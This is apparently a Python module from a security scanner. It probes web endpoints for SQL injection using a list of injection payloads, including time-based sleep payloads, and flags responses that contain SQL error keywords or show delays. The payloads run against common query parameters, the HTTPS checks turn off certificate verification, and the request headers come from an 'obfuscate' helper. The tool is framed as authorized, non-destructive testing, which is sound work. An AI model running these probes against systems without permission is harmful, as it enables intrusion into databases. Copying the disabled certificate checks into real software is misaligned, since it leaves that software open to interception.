"""
Basic SQL Injection Probe - Safe, non-destructive checks for authorized testing only.
Sends test payloads to HTTP endpoints with query params; checks for error messages, status changes, time-based delays.
Scope: only when --injection flag; avoid destructive payloads.
"""

import time
import ssl
from dataclasses import dataclass
from typing import List, Optional
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

from scanner.obfuscate import get_http_headers

# Safe, non-destructive SQLi probe payloads (error-based and boolean)
SQLI_PAYLOADS = [
    ("' OR '1'='1", "classic OR"),
    ("1' OR '1'='1", "OR true"),
    ("1;--", "comment"),
    ("' OR 1=1--", "OR 1=1"),
    ("1 AND 1=1", "AND true"),
    ("1' AND '1'='1", "AND quoted"),
    ("\" OR \"1\"=\"1", "double-quote OR"),
    ("1 UNION SELECT NULL--", "union select"),
    ("1' ORDER BY 1--", "order by"),
    ("'; WAITFOR DELAY '0:0:2'--", "mssql delay hint"),
]

# Time-based blind SQLi: (payload, name, expected_delay_seconds)
# Use short delays to keep scans reasonable; only run when injection=True
SQLI_TIME_BASED = [
    ("1' AND SLEEP(2)--", "mysql_sleep", 2),
    ("1'; SELECT pg_sleep(2)--", "postgres_sleep", 2),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "mysql_sleep_alt", 2),
]

# Indicators of potential SQL injection (error messages, etc.)
SQL_ERROR_INDICATORS = [
    "sql", "mysql", "postgresql", "ora-", "syntax error", "unclosed quotation",
    "quoted string", "pg_query", "mysqli", "sqlite", "odbc", "jdbc",
    "driver", "database", "select", "insert", "update", "delete",
    "warning:", "error:", "exception", "invalid", "sqlstate", "sqlite_",
    "mariadb", "mysqli_", "pg_exec", "ora-01", "ora-00",
]


@dataclass
class InjectionFinding:
    """SQL injection probe finding."""
    host: str
    port: int
    url: str
    payload: str
    payload_name: str
    indicator: str
    severity: str = "high"


def _fetch_url(url: str, timeout: float, ctx: Optional[ssl.SSLContext] = None) -> tuple[int, str]:
    """Fetch URL, return (status_code, body_preview)."""
    try:
        req = Request(url, headers=get_http_headers())
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(4096).decode("utf-8", errors="ignore")
            return (r.status, body[:500])
    except HTTPError as e:
        return (e.code, str(e)[:500])
    except (URLError, OSError):
        return (-1, "")


def probe_param(
    base_url: str, param: str, payload: str, payload_name: str,
    use_https: bool, timeout: float,
) -> Optional[InjectionFinding]:
    """Probe a single parameter with payload."""
    from urllib.parse import quote
    ctx = None
    if use_https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    sep = "&" if "?" in base_url else "?"
    encoded = quote(payload, safe="")
    test_url = f"{base_url}{sep}{param}={encoded}"
    status, body = _fetch_url(test_url, timeout, ctx)
    body_lower = body.lower()
    for ind in SQL_ERROR_INDICATORS:
        if ind in body_lower:
            return InjectionFinding(
                host="", port=0, url=test_url, payload=payload, payload_name=payload_name,
                indicator=ind, severity="high",
            )
    return None


def _probe_time_based(
    base_url: str,
    param: str,
    payload: str,
    payload_name: str,
    use_https: bool,
    timeout: float,
    expected_delay: float,
) -> Optional[InjectionFinding]:
    """Probe with time-based payload; if response is delayed by ~expected_delay, possible blind SQLi."""
    from urllib.parse import quote
    ctx = None
    if use_https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    sep = "&" if "?" in base_url else "?"
    encoded = quote(payload, safe="")
    test_url = f"{base_url}{sep}{param}={encoded}"
    t0 = time.perf_counter()
    try:
        req = Request(test_url, headers=get_http_headers())
        with urlopen(req, timeout=timeout + expected_delay + 2, context=ctx) as r:
            r.read(4096)
    except Exception:
        pass
    elapsed = time.perf_counter() - t0
    if elapsed >= expected_delay * 0.9:  # Allow 10% tolerance
        return InjectionFinding(
            host="", port=0, url=test_url, payload=payload, payload_name=payload_name,
            indicator=f"time-based delay ~{elapsed:.1f}s ({payload_name})",
            severity="high",
        )
    return None


def run_injection_probes(
    host: str,
    ports: List[int],
    base_path: str = "/",
    timeout: float = 5.0,
    time_based: bool = True,
) -> List[InjectionFinding]:
    """
    Run SQL injection probes on HTTP/HTTPS endpoints (error-based and optional time-based).
    Only probes when --injection flag is set. Uses safe, non-destructive payloads.
    """
    findings = []
    http_ports = [80, 8080, 8000, 8888]
    https_ports = [443, 8443, 4433]
    params = ["id", "page", "q", "search", "user", "name", "cat", "category"]

    for port in ports:
        use_https = port in https_ports
        if port not in http_ports and port not in https_ports:
            continue
        scheme = "https" if use_https else "http"
        base = f"{scheme}://{host}:{port}{base_path}"
        if "?" not in base:
            base = base.rstrip("/") + "/"
        ctx = None
        if use_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        time_based_params_tried = 0
        for param in params:
            for payload, name in SQLI_PAYLOADS:
                f = probe_param(base, param, payload, name, use_https, timeout)
                if f:
                    f.host = host
                    f.port = port
                    findings.append(f)
                    break
            if time_based and time_based_params_tried < 2:  # Cap to 2 params to limit scan time
                time_based_params_tried += 1
                for payload, name, expected_delay in SQLI_TIME_BASED:
                    f = _probe_time_based(base, param, payload, name, use_https, timeout, expected_delay)
                    if f:
                        f.host = host
                        f.port = port
                        findings.append(f)
                        break
    return findings
